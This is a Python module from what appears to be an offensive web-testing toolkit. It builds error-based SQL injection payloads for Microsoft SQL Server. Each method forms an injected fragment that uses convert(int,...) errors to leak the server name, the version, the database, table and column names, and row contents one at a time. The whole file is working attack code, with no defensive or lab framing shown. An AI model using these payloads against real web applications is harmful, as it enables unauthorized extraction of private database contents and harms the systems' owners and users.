# author: WatchDogOblivion
# description: TODO
# WatchDogs Error SQL Request Response Queries

from watchdogs.base.models import AllArgs # pylint: disable=unused-import
from watchdogs.web.models import ErrorSQLIRRHelper  # pylint: disable=unused-import
from watchdogs.web.parsers import ErrorSQLIArgs
from watchdogs.utils.Constants import INJECTION_TYPES

QUERY_TYPES = [
    "SERVER_NAME", "DATABASE_VERSION", "CURRENT_DATABASE", "DATABASES", "DATABASE_TABLES", "TABLE_COLUMNS",
    "COLUMN_ROW"
]

class ErrorSQLIRRQueries(object):  # pylint: disable=too-few-public-methods

  class InsertionType(object):

    @staticmethod
    def getServerName(allArgs):
      # type: (AllArgs) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,(@@servername))){1}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.commentOut)

    @staticmethod
    def getDatabaseVersion(allArgs):
      # type: (AllArgs) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,(@@version))){1}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.commentOut)

    @staticmethod
    def getCurrentDatabase(allArgs):
      # type: (AllArgs) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,(SELECT DB_NAME()))){1}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.commentOut)

    @staticmethod
    def getDatabases(allArgs, helper):
      # type: (AllArgs, ErrorSQLIRRHelper) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,("
               "SELECT{1}name{1}FROM{1}master.dbo.sysdatabases{1}"
               "ORDER{1}BY{1}name{1}{2}{1}OFFSET{1}{3}{1}ROWS{1}FETCH{1}NEXT{1}1{1}ROWS{1}ONLY"
               "))){4}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.wordDelimiter, helper.getOrdering(),
                          helper.getQueryOffset(), errorSQLIArgs.commentOut)

    @staticmethod
    def getDatabaseTables(allArgs, helper):
      # type: (AllArgs, ErrorSQLIRRHelper) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,("
               "SELECT{1}table_name{1}from{1}{2}.information_schema.tables{1}"
               "ORDER{1}BY{1}table_name{1}{3}{1}OFFSET{1}{4}{1}ROWS{1}FETCH{1}NEXT{1}1{1}ROWS{1}ONLY"
               "))){5}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.wordDelimiter, helper.getDatabaseName(),
                          helper.getOrdering(), helper.getQueryOffset(), errorSQLIArgs.commentOut)

    @staticmethod
    def getTableColumns(allArgs, helper):
      # type: (AllArgs, ErrorSQLIRRHelper) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,("
               "SELECT{1}column_name{1}from{1}{2}.information_schema.columns{1}where{1}table_name='{3}'{1}"
               "ORDER{1}BY{1}column_name{1}{4}{1}OFFSET{1}{5}{1}ROWS{1}FETCH{1}NEXT{1}1{1}ROWS{1}ONLY"
               "))){6}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.wordDelimiter, helper.getDatabaseName(),
                          helper.getTableName(), helper.getOrdering(), helper.getQueryOffset(),
                          errorSQLIArgs.commentOut)

    @staticmethod
    def getColumnRow(allArgs, helper):
      # type: (AllArgs, ErrorSQLIRRHelper) -> str
      errorSQLIArgs = allArgs.getArgs(ErrorSQLIArgs)
      query = ("{0},convert(int,("
               "SELECT{1}{2}{1}from{1}{3}.dbo.{4}{1}"
               "ORDER{1}BY{1}{5}{1}{6}{1}OFFSET{1}{7}{1}ROWS{1}FETCH{1}NEXT{1}1{1}ROWS{1}ONLY"
               "))){8}")
      return query.format(errorSQLIArgs.terminator, errorSQLIArgs.wordDelimiter, helper.getColumnName(),
                          helper.getDatabaseName(), helper.getTableName(), helper.getOrderBy(),
                          helper.getOrdering(), helper.getQueryOffset(), errorSQLIArgs.commentOut)

  @staticmethod
  def setQuery(allArgs, helper):  # pylint: disable=too-many-branches
    #type: (AllArgs, ErrorSQLIRRHelper) -> None
    helper.setOrdering(allArgs.getArgs(ErrorSQLIArgs).ordering)
    injectionType = allArgs.getArgs(ErrorSQLIArgs).injectionType
    queryType = helper.getQueryType()

    if (injectionType == INJECTION_TYPES[1]):
      if (queryType == QUERY_TYPES[0]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getServerName(allArgs))
      elif (queryType == QUERY_TYPES[1]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getDatabaseVersion(allArgs))
      elif (queryType == QUERY_TYPES[2]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getCurrentDatabase(allArgs))
      elif (queryType == QUERY_TYPES[3]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getDatabases(allArgs, helper))
      elif (queryType == QUERY_TYPES[4]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getDatabaseTables(allArgs, helper))
      elif (queryType == QUERY_TYPES[5]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getTableColumns(allArgs, helper))
      elif (queryType == QUERY_TYPES[6]):
        helper.setQuery(ErrorSQLIRRQueries.InsertionType.getColumnRow(allArgs, helper))
